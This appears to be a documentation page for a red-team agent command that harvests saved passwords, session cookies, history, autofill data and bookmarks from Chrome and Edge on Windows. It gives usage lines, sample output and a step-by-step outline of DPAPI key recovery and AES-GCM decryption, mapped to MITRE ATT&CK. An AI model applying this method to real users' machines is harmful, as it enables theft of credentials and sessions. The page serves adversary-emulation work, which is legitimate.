+++
title = "browser"
chapter = false
weight = 25
hidden = false
+++

{{% notice info %}}Windows Only{{% /notice %}}

## Summary

Harvest saved credentials, cookies, browsing history, autofill form data, and bookmarks from Chromium-based browsers (Chrome, Edge). Reads the browser's `Local State` file to extract the AES encryption key (protected by Windows DPAPI), then queries the appropriate SQLite database. Supports both modern AES-256-GCM encryption (v10/v11 prefix) and legacy DPAPI-only format. Automatically handles multiple browser profiles.

### Arguments

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| action | choose_one | No | passwords | `passwords` — saved login credentials; `cookies` — session cookies; `history` — browsing history; `autofill` — form data; `bookmarks` — saved URLs |
| browser | choose_one | No | all | `all`, `chrome`, or `edge` — which browser(s) to target |

## Usage

### Harvest All Browser Credentials

Extract saved passwords from all installed Chromium-based browsers:
```
browser
```

### Target Specific Browser

Harvest from Chrome only:
```
browser -action passwords -browser chrome
```

### Harvest Cookies

Extract session cookies from all browsers:
```
browser -action cookies
```

### Harvest Browsing History

Extract recent browsing history (last 500 entries per profile):
```
browser -action history
```

### Harvest Autofill Data

Extract saved form field data (names, addresses, emails, phone numbers):
```
browser -action autofill
```

### Harvest Bookmarks

Extract saved bookmarks with folder structure:
```
browser -action bookmarks
```

### Example Output (history)
```
=== Browser History (3 entries) ===

[Chrome] Company Intranet Portal
  https://intranet.corp.local/dashboard  (visits: 47, last: 2026-03-05 14:30:22)
[Chrome] AWS Console
  https://console.aws.amazon.com/  (visits: 12, last: 2026-03-05 10:15:00)
[Edge] SharePoint
  https://company.sharepoint.com/  (visits: 8, last: 2026-03-04 09:00:00)
```

### Example Output (autofill)
```
=== Browser Autofill (4 entries) ===

[Chrome] email = admin@corp.local  (used: 15 times, last: 2026-03-05 12:00:00)
[Chrome] phone = 555-0123  (used: 3 times, last: 2026-03-01 09:30:00)
[Chrome] address = 123 Main St  (used: 2 times, last: 2026-02-28 14:00:00)
```

### Example Output (bookmarks)
```
=== Browser Bookmarks (3 found) ===

[Chrome] [bookmark_bar] Internal Wiki
  https://wiki.corp.local/
[Chrome] [bookmark_bar/Work] Jenkins CI
  https://jenkins.corp.local:8080/
[Edge] [other] Azure DevOps
  https://dev.azure.com/company/
```

### Example Output (credentials found)
```
=== Browser Credentials (3 found) ===

Browser:  Edge
URL:      https://login.example.com/
Username: user@example.com
Password: P@ssw0rd123

Browser:  Chrome
URL:      https://github.com/login
Username: devuser
Password: gh_token_abc123
```

## How It Works

1. Locates browser `User Data` directory in `%LOCALAPPDATA%`
2. Reads `Local State` JSON to extract the base64-encoded encryption key
3. Strips the "DPAPI" prefix and decrypts the AES key using `CryptUnprotectData`
4. Copies the target SQLite database to a temp file (avoids browser lock)
5. Queries the relevant table for the selected action
6. For encrypted data (passwords, cookies): decrypts using AES-256-GCM with the recovered key
7. Cleans up temp files after extraction

## Notes

- The agent must run as the same user who saved the credentials (DPAPI is user-bound)
- The browser does not need to be closed — databases are copied to avoid lock conflicts
- Multi-profile support: automatically discovers Default and numbered profiles (Profile 1, Profile 2, etc.)
- Legacy passwords (pre-v80 Chrome) use direct DPAPI encryption and are also supported
- Cookie database location: Chrome 96+ stores cookies in `Network/Cookies`, older versions in profile `Cookies`
- History and autofill do not require DPAPI decryption — data is stored in plaintext SQLite
- Bookmarks are stored as a JSON file (no database, no encryption)
- History returns up to 500 most recent entries per profile, ordered by last visit time
- Autofill returns up to 500 most recent entries per profile, ordered by last use date
- Chrome timestamps use a custom epoch (microseconds since 1601-01-01 UTC)

## MITRE ATT&CK Mapping

- T1555.003 — Credentials from Password Stores: Credentials from Web Browsers
- T1217 — Browser Information Discovery
